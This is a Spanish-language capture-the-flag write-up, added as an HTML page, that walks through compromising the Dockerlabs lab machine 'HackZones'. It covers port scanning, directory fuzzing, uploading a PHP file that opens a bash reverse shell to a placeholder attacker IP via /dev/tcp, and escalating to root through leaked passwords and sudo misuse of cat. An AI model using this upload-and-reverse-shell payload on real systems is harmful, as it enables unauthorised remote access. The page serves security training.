@@ -1,0 +1,299 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>S31sh1r0</title>
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css">
+    <link rel="stylesheet" href="https://n4g1h4ck.github.io/css/prism.css">
+    <link rel="stylesheet" href="https://n4g1h4ck.github.io/css/writeups.css">
+    <link rel="stylesheet" href="https://n4g1h4ck.github.io/css/writeup_article.css">
+</head>
+<body>
+    <header class="header">
+        <nav class="navbar">
+            <a href="https://n4g1h4ck.github.io/index.html">Inicio</a>
+            <a href="https://n4g1h4ck.github.io/tools.html">Herramientas</a>
+            <a href="https://n4g1h4ck.github.io/writeups.html">Writeups</a>
+        </nav>
+    </header>
+    <div class="wrapper">
+        <asíde class="sidebar">
+            <h3 class="index">Índice</h3>
+            <div class="platforms">
+                <h4 class="dockerlabs">Dockerlabs</h4>
+                <ul class="list_writeups">
+                    <li><a href="https://n4g1h4ck.github.io/dl/hackzones.html">HackZones</a></li>
+                    <li><a href="https://n4g1h4ck.github.io/dl/showtime.html">ShowTime</a></li>
+                </ul>
+                <h4 class="hackthebox">Hackthebox</h4>
+                <ul class="list_writeups">
+                </ul>
+            </div>
+        </asíde>
+
+        <main class="content">
+            <article class="writeup">
+                <h2 class="writeup_title">HackZones</h2>
+                <h2 class="writeup_platform">Plataforma: <span class="dl">Dockerlabs</span></h2>
+                <h3 class="writeup_subtitle">Fase de Reconocimiento</h3>
+                <p class="description">
+                    Empezamos enviando una traza ICMP a la máquina para comprobar que tenemos conectividad.
+                </p>
+                <pre class="code"><code class="language-ruby">$ ping -c 1 172.17.0.2
+
+PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data.
+64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.164 ms
+
+--- 172.17.0.2 ping statistics ---
+1 packets transmitted, 1 received, 0% packet loss, time 0ms
+rtt min/avg/max/mdev = 0.164/0.164/0.164/0.000 ms</code></pre>
+                <p class="description">
+                    En base al <span class="highlight">ttl</span> nos damos cuenta que la máquina es una <b>Linux</b>, ya que normalmente un ttl de 64 = Linux y un ttl 128 = Windows (<i>aunque este valor se puede cambiar</i>)
+                </p>
+                <p class="description">
+                    Con <span class="highlight">nmap</span> escaneamos los puertos abiertos de la máquina víctima de la siguiente manera:
+                </p>
+                <pre class="code"><code class="language-ruby">nmap -p- --open --min-rate 5000 -sS -n -Pn -vvv 172.17.0.2 -oG allPorts</code></pre>
+                <p class="description">
+                    Con el parámetro <code class="language-ruby">-p-</code> le indicamos que queremos escanear todo el rango de puertos (<i>del 1 al 65535</i>).
+                    <br>
+                    <br>
+                    Como queremos que nos reporte solo los puertos abierto le ponemos el <code class="language-ruby">--open</code>
+                    <br>
+                    <br>
+                    El <code class="language-ruby">--min-rate 5000</code> es para decirle que queremos enviar paquetes no mas lentos que 5000 paquetes por segundo.
+                    <br>
+                    <br>
+                    Con el parámetro <code class="language-ruby">-sS</code> le indicamos a Nmap que realice un escaneo sigiloso (<i>stealth scan</i>), con esto no concluimos el <b>three way handshake</b>.
+                    <br><br>
+                    El parámetro <code class="language-ruby">-n</code> se lo ponemos para que no nos haga resolución DNS.
+                    <br><br>
+                    El <code class="language-ruby">-Pn</code> funciona para que no nos haga descubrimiento de host.
+                    <br><br>
+                    Con el <i>triple verbose</i> <code class="language-ruby">-vvv</code> le indicamos que a medida de que me vaya realizando el escaneo nos vaya mostrando todo por consola.
+                    <br><br>
+                    Y por último, con el parámetro <code class="language-ruby">-oG allPorts</code> le indicamos que queremos exportar la evidencia en un formato grepeable al archivo <i>allPorts</i>, para que mas adelante con la herramienta <b>extractPorts</b> nos copie los puertos en la clipboard.
+                </p>
+                <p class="description">El output de este escaneo se vería algo así:</p>
+                <pre class="code"><code class="language-ruby">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-16 10:10 -04
+Initiating ARP Ping Scan at 10:10
+Scanning 172.17.0.2 [1 port]
+Completed ARP Ping Scan at 10:10, 0.04s elapsed (1 total hosts)
+Initiating SYN Stealth Scan at 10:10
+Scanning 172.17.0.2 [65535 ports]
+Discovered open port 22/tcp on 172.17.0.2
+Discovered open port 80/tcp on 172.17.0.2
+Discovered open port 53/tcp on 172.17.0.2
+Completed SYN Stealth Scan at 10:10, 0.73s elapsed (65535 total ports)
+Nmap scan report for 172.17.0.2
+Host is up, received arp-response (0.0000040s latency).
+Scanned at 2024-12-16 10:10:29 -04 for 0s
+Not shown: 65532 closed tcp ports (reset)
+PORT   STATE SERVICE REASON
+22/tcp open  ssh     syn-ack ttl 64
+53/tcp open  domain  syn-ack ttl 64
+80/tcp open  http    syn-ack ttl 64
+MAC Address: 02:42:AC:11:00:02 (Unknown)
+
+Read data files from: /usr/bin/../share/nmap
+Nmap done: 1 IP address (1 host up) scanned in 0.98 seconds
+           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)</code></pre>
+                <p class="description">Ahora realizo un escaneo de puertos mas exaustivo, tal que así:</p>
+                <pre class="code"><code class="language-ruby">nmap -sCV -p22,53,80 172.17.0.2 -oN targeted</code></pre>
+                <p class="description">
+                    Con el parámetro <code class="language-ruby">-sCV</code> le indico a nmap que quiero que aplique algunos <i>scripts de reconocimiento</i> y me detecte las versiones y servicios que emplean cada uno de los puertos.
+                    <br><br>
+                    Con <code class="language-ruby">-p22,53,80</code> le indico los puertos.
+                    Y al final, con el parámetros <code class="language-ruby">-oN targeted</code> le digo a nmap que me exporte la evidencia tal cual me la muestra por consola al archivo <i>targeted</i>.
+                </p>
+                <p class="description">El output sería:</p>
+                <pre class="code"><code class="language-ruby">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-16 11:22 -04
+Nmap scan report for hackzones.hl (172.17.0.2)
+Host is up (0.000041s latency).
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 8e:a2:56:38:e1:85:2f:21:2b:55:ec:29:5b:f8:63:d9 (ECDSA)
+|_  256 0f:4b:38:fa:04:33:c7:01:5a:98:12:05:2d:42:cf:1a (ED25519)
+53/tcp open  domain  ISC BIND 9.18.28-0ubuntu0.24.04.1 (Ubuntu Linux)
+| dns-nsid: 
+|_  bind.version: 9.18.28-0ubuntu0.24.04.1-Ubuntu
+80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
+|_http-title: DNS Secure Login
+|_http-server-header: Apache/2.4.58 (Ubuntu)
+MAC Address: 02:42:AC:11:00:02 (Unknown)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 15.02 seconds</code></pre>
+                <p class="description">
+                    Como esta el puerto <i>80 http</i> abierto, ejecuto un <code class="language-ruby">whatweb http://172.17.0.2</code> y esto nos responde con:
+                </p>
+                <pre class="code code_oneliner"><code class="language-ruby">http://172.17.0.2 [200 OK] Apache[2.4.58], Country[RESERVED][ZZ], HTML5,HTTPServer[Ubuntu Linux][Apache/2.4.58 (Ubuntu)], IP[172.17.0.2], Title[HackZones.hl - Seguridad para tu Empresa]</code></pre>
+                <p class="description">
+                    Ahora abro en el navegador el servicio http y muestra este sitio web:
+                    <br><br>
+                    <img src="https://n4g1h4ck.github.io/images/DL/hackzones.png" alt="hackzones web">
+                    <br><br>
+                    Seguro te habras dado cuenta que la página expone un dominio (hackzones.hl), pero si intentamos abrirlo en el navegador este no lo reconocerá, ya que posiblemente se estara empleando <i>virtual hosting</i>, y de ser cierto, puede que nos muestre algo diferente a la web original. Entonces para que nos resuelva el dominio debemos añadirlo al <i>/etc/hosts</i>
+                </p>
+                <pre class="code"><code class="language-ruby"># Host addresses
+127.0.0.1  localhost
+::1        localhost ip6-localhost ip6-loopback
+ff02::1    ip6-allnodes
+ff02::2    ip6-allrouters
+
+# Others
+172.17.0.2   hackzones.hl</code></pre>
+                <p class="description">
+                    Ahora si lo abrimos en el navegador, nos dirige a la siguiente web:
+                    <br><br>
+                    <img src="https://n4g1h4ck.github.io/images/DL/hackzones2.png" alt="hackzones.hl">
+                    <br><br>
+                    Probé credenciales comunes, la típica <i>admin</i> y <i>admin</i> y <i>ataques de injección sql</i> pero no funcionó.
+                </p>
+                <h3 class="writeup_subtitle">Aplicando Fuzzing</h3>
+                <p class="description">
+                    Como no veo nada interesante a plena vista, con <span class="highlight">wfuzz</span> aplicare fuzzing para descubrir directorios y archivos que se encuentren en la web
+                </p>
+                <pre class="code"><code class="language-ruby">wfuzz -c --hc=404 -t 200 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt 'http://hackzones.hl/FUZZ/'</code></pre>
+                <p class="description">
+                    Con el parámetro <code class="language-ruby">-c</code> le digo que me muestre el resultado en formato colorizado.
+                    <br><br>
+                    Con <code class="language-ruby">--hc=404</code> le indico que no me muestre resultados con el código 404.
+                    <br><br>
+                    <code class="language-ruby">-w</code> es para indicar el diccionario, que en este caso utilizo el <i>/usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt</i> del repositorio de <i>github SecLists</i>.
+                    <br><br>
+                    Por último le indico la url + la palabra <i>FUZZ</i> que es propia de wfuzz.
+                </p>
+                <hr>
+                <p class="description">
+                    En el output me muestra que encontró una carpeta llamada <i class="highlight">upload</i> con un código de estado 200.Si la abrimos nos damos cuenta que tenemos capacidad de <i>directory listing</i>, pero no vemos nada. así que seguiré haciendo fuzzing pero de otra manera.
+                </p>
+                <p class="description">
+                    Esta vez le indicaré a wfuzz que me muestre páginas.html, para esto es tan fácil como cambiar la url <span class="highlight">http://hackzones.hl/FUZZ/</span> por <span class="highlight">http://hackzones.hl/FUZZ.html</span> añadiendo .html al final de FUZZ.
+                </p>
+                <p class="description">
+                    Esto muestra, entre otras cosas, lo siguiente:
+                </p>
+                <pre class="code"><code class="language-ruby">000000001:   200        23 L     62 W       860 Ch      "index"
+000002913:   200        181 L    450 W      5671 Ch     "dashboard"</code></pre>
+                <p class="description">
+                    El <i>index.html</i> es la página por defecto y si entramos a <i>dashboard.html</i> nos encontramos con un dashboard y si vemos bien, nos damos cuenta que somos el usuario <i>admin</i> (obviamente esta web esta mal hecha por esta parte).
+                    <br><br>
+                    <img src="https://n4g1h4ck.github.io/images/DL/hackzones3.png" alt="hackzones dashboard">
+                    <br><br>
+                    Si presionamos en el boton circular que dice admin, nos aparece una ventana donde podemos subir una foto de perfil.
+                    <br><br>
+                    <img src="https://n4g1h4ck.github.io/images/DL/hackzones4.png" alt="hackzones dashboard2">
+                    <br><br>
+                    En este caso intentaremos subir un archivo que NO sea una imagen para ver si tenemos capacidad de subir lo que queramos y con ello obtener un <span class="highlight">RCE</span> (<i>Remote Comand Execution</i>).
+                </p>
+                <p class="description">
+                    A modo de prueba, subiré un <i>archivo.txt</i> para ver que me responde.
+                    <br><br>
+                    <img src="https://n4g1h4ck.github.io/images/DL/hackzones5.png" alt="hackzones">
+                    <br><br>
+                    Podemos ver que el archivo se subió sin ningún problema. Revisamos en la direccion <i>http://hackzones.hl/uploads/</i> y nos aparece el archivo, lo abrimos y nos muestra el contenido.
+                    <br><br>
+                    <img src="https://n4g1h4ck.github.io/images/DL/hackzones6.png" alt="hackzones">
+                    <br><br>
+                    Entonces, al ver en el <i>Wappalyzer</i> que la web interpreta código php, procederé a subir un script php que al abrirlo ejecuta un <i>oneliner en bash</i> que nos da una <i class="highlight">Reverse Shell</i> a nuestra máquina atacante.
+                </p>
+                <pre class="code"><code class="language-php">&lt?php system("bash -c 'bash -i >& /dev/tcp/IP_DE_LA_máquina_ATACANTE/PUERTO_LOCAL 0>&1'"); ?></code></pre>
+                <p class="description">
+                    Subimos el script sin ningún problema y antes de abrirlo debemos estar en escucha con <i class="highlight">netcat</i>.
+                </p>
+                <pre class="code"><code class="language-ruby">nc -nlvp PUERTO_ESPECIFICADO_EN_EL_SCRIPT_PHP</code></pre>
+                <p class="description">
+                    Lo abrimos y obtenemos la <i>Reverse Shell</i>.
+                    <br><br>
+                    <img src="https://n4g1h4ck.github.io/images/DL/hackzones7.png" alt="">
+                </p>
+                <h3 class="writeup_subtitle">Tratamiento de la tty</h3>
+                <p class="description">Empezamos dándonos una <i>pseudoconsola</i></p>
+                <pre class="code"><code class="language-ruby">script /dev/null -c bash</code></pre>
+                <p class="description">Ahora presionamos en el teclado <i>Ctrl+z</i></p>
+                <p class="description">Luego de esto escribimos lo siguiente</p>
+                <pre class="code"><code class="language-ruby">stty raw -echo;fg</code></pre>
+                <p class="description">Después escribimos</p>
+                <pre class="code"><code class="language-ruby">reset xterm</code></pre>
+                <p class="description">Y presionamos enter, esto se vería así:</p>
+                <br><br>
+                <img src="https://n4g1h4ck.github.io/images/DL/hackzones8.png" alt="hackzones">
+                <br><br>
+                <p class="description">Ahora podemos ejecutar Ctrl+c sin que afecte a la terminal, para ejecutar <i>Ctrl+l</i> y se nos limpie la pantalla debemos ejecutar <span class="highlight">export TERM=xterm</span> y ahora debería funcionar</p>
+                <p class="description">
+                    si ejecutamos <i class="highlight">nano</i> vemos que las proporciones no son las adecuadas, para cambiarlo nos iremos a una terminal a parte y ejecutaremos <code class="language-ruby">stty size</code> y respondera con dos valores, por ejemplo: 36 140.
+                    <br><br>
+                    Entonces, en la terminal donde estabamos antes ejecutaremos <code class="language-ruby">stty rows 36 columns 140</code> para cambiar las dimensiones, ahora si ejecutamos <i class="highlight">nano</i> este debería tener las proporciones verdaderas.
+                </p>
+                <h3 class="writeup_subtitle">Escalada de Privilegios</h3>
+                <p class="description">
+                    Si empezamos a explorar directorios nos daremos cuenta que existe un usuario llamado <i>mrrobot</i> pero no podemos convertirnos en el ya que no contamos con una contraseña. Después de buscar, encontre un carpeta llamada <i>supermegaultrasecretfolder</i> en la ruta <i>/var/www/html</i> que contiene un archivo bash llamado <i>secret.sh</i> el cual no podemos ejecutar ya que no somos root, si le hacemos un <i class="highlight">cat</i> al archivo veremos un código en bash un tanto peculiar.
+                </p>
+                <pre class="code"><code class="language-bash">#!/bin/bash
+if [ "$(id -u)" -ne 0 ]; then
+  echo "Este script debe ser ejecutado como root."
+  exit 1
+fi
+
+p1=$(echo -e "\x50\x61\x73\x73\x77\x6f\x72\x64") 
+p2="\x40"                                       
+p3="\x24\x24"                                   
+p4="\x21\x31\x32\x33"                           
+
+echo -e "${p1}${p2}${p3}${p4}"</code></pre>
+                <p class="description">Utilicé <a href="https://gemini.google.com" class="highlight">Gemini ai</a> para descubrir que hacía este script.</p>
+                <p class="description">
+                    Verificación de privilegios de root:
+                    <br><br>
+                    <code class="language-ruby">if [ "$(id -u)" -ne 0 ]; then</code>: Esta línea verifica si el ID de usuario actual ($(id -u)) es diferente de 0. El ID de usuario de root es 0.
+                    <br><br>
+                    <code class="language-ruby">echo "Este script debe ser ejecutado como root."</code>: Si el script no se está ejecutando como root, se imprime este mensaje en la consola.
+                    <br><br>
+                    <code class="language-ruby">exit 1</code>: El script se detiene con un código de error 1, indicando que la ejecución no fue exitosa.
+                    <br><br>
+                Definición de variables:
+                <br><br>
+                    <code class="language-ruby">p1=$(echo -e "\x50\x61\x73\x73\x77\x6f\x72\x64")</code>: Esta línea define la variable p1 con la cadena "Password" utilizando códigos de escape hexadecimales.
+                    <br><br>
+                    <code class="language-ruby">p2="\x40"</code>: Define p2 con el símbolo "@".
+                    <br><br>
+                    <code class="language-ruby">p3="\x24\x24"</code>: Define p3 con dos símbolos de dólar "$$".
+                    <br><br>
+                    <code class="language-ruby">p4="\x21\x31\x32\x33"</code>: Define p4 con la cadena "!123".
+                    <br><br>
+            
+                Impresión de la cadena:
+                <br><br>
+                    <code class="language-ruby">echo -e "${p1}${p2}${p3}${p4}"</code>: Esta línea imprime la concatenación de las variables p1, p2, p3 y p4 en la consola. El uso de echo -e permite interpretar las secuencias de escape.
+            <br><br>
+            Salida esperada:
+            <br><br>
+            Si el script se ejecuta como root, la salida será:
+            <br><br>
+            <span class="highlight">Password@$$!123</span>
+                </p>
+
+                <p class="description">Como tenemos una contraseña, intentaremos probarla con el usuario <i>mrrobot</i> y vemos que funciona.</p>
+                <p class="description">Si ejecutamos <i>sudo -l</i> vemos que podemos ejecutar <i class="highlight">cat</i> como cualquier usuario y sin proporcionar contraseña</p>
+                <img src="https://n4g1h4ck.github.io/images/DL/hackzones9.png" alt="hackzones">
+                <p class="description">Si seguimos buscando, nos daremos cuenta que en la ruta <i>/opt</i> existe un archivo llamado <i>SistemUpdate</i> el cual no tenemos capacidad de lectura, entonces, ya que podemos utilizar <i class="highlight">cat</i> como <i>root</i> lo ejecutaremos con el archivo.
+                <br><br>
+                <img src="https://n4g1h4ck.github.io/images/DL/hackzones10.png" alt="hackzones">
+                <br><br>
+                Vemos en la respuesta una linea interesante que dice <i class="highlight">"Extracting user root:rooteable from packages: 50%"</i> donde podemos pensar que la contraseña para el usuario <i>root</i> es <i>"rooteable"</i>, ejecutamos <code class="language-ruby">su root</code> y escribimos <i>rooteable</i> y vemos que al final si era su contraseña.
+            </article>
+        </main>
+    </div>
+    <footer class="footer">
+        <a target="_blank" href="https://github.com/n4g1h4ck" class="link bi bi-github"></a>
+    </footer>
+    <script src="https://n4g1h4ck.github.io/js/prism.js"></script>
+</body>
+</html>
+
+<!-- 15 de diciembre del 2024 -->
